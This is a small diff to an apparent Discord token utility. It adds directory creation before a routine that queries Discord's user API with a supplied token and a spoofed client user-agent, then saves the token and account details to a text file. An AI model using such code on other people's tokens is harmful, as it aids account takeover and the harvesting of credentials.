@@ -1389,6 +1389,8 @@ elif mode == "HeavyInfo":
         headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
         src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
         response = json.loads(src.content)
+        if not os.path.exists("users"):
+            os.mkdir('users')
         with open ('users/{}_HEAVY.txt'.format(client.user.name),'w+',errors='ignore') as handle:
             handle.write('====================================\n')
             handle.write('Token: '+token+'\n')
